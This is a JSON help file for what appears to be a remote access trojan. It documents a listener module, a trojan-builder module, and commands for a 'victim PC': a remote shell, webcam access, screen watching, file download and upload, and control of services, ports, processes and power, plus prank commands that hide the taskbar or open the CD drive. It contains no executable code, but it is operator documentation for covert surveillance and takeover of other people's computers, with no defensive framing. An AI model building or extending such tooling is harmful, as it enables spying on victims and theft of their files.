{
    "listen" : {
        "options" : {
            "info" : "show usable options",
            "example" : ""
        },
        "set" : {
            "info" : "set usable value",
            "example" : "set LHost 127.0.0.1" 
            },
        "run" : {
            "info" : "execute payload"
            },
        "description" : "server listen module"
    },
    "builder" : {
        "options" : {
            "info" : "show usable options",
            "example" : ""
        },
        "set" : {
            "info" : "set usable value",
            "example" : "set LHost 127.0.0.1" 
            },
        "run" : {
            "info" : "execute payload"
            },
        "description" : "build trojan module"
    },
    "controled" : {
        "shell" : {
            "info" : "remote cmd, enter shell and change to shell mode"
        },
        "webcam" : {
            "info" : "access the camara of the laptop"
        },
        "screen" : {
            "info" : "watch the screen of the PC"
        },
        "manager" : {
            "info" : "manage the file, process, registry and service of the PC",
            "command" : {
                "file" : {
                    "info" : "manage the file, you need to type \"file\" to enter this mode",
                    "command" : {
                        "list" : {
                            "info" : "list file by path",
                            "example" : {
                                "1" : "list",
                                "2" : "list C:\\Users\\user\\Desktop\\Folder"
                            } 
                        },
                        "download" : {
                            "info" : "download file from victim PC",
                            "example" : "download C:\\Target file\\test.pdf C:\\Local save\\test.pdf"
                        },
                        "upload" : {
                            "info" : "upload file to victime PC",
                            "example" : "upload C:\\Local save\\test.pdf C:\\Target file\\test.pdf"
                        }
                    }
                },
                "service" : {
                    "info" : "access all service on victim PC"
                },
                "port" : {
                    "info" : "Control all port on victim PC"
                },
                "process" : {
                    "info" : "Control process on victim PC"
                },
                "power" : {
                    "info" : "Control power of victime PC, you can power on/off it"
                }
            }
        },
        "funstuff" : {
            "info" : "run fun or evil command on victim PC",
            "command" : {
                "msgbox" : {
                    "info" : "show message box on victim PC",
                    "example" : "title,text,(integer value of button),(integer value of icon)",
                    "help" : "show detail"
                },
                "taskbar" : {
                    "info" : "This command can hide/show the taskbar",
                    "command" : {
                        "taskbar hide" : "hide the taskbar",
                        "taskbar show" : "show the taskbar"
                    }
                },
                "drive" : {
                    "info" : "This command can open/close CD drive",
                    "command" : {
                        "drive open" : "open CD drive",
                        "drive close" : "close CD drive"
                    }
                },
                "startorb" : {
                    "info" : "This command can hide/show Start Orb",
                    "command" : {
                        "startorb hide" : "hide start",
                        "startorb show" : "show start"
                    }
                },
                "clock" : {
                    "info" : "This command can hide/show Clock",
                    "command" : {
                        "clock hide" : "hide clock",
                        "clock show" : "show clock"
                    }
                }
            }
        }
    }
}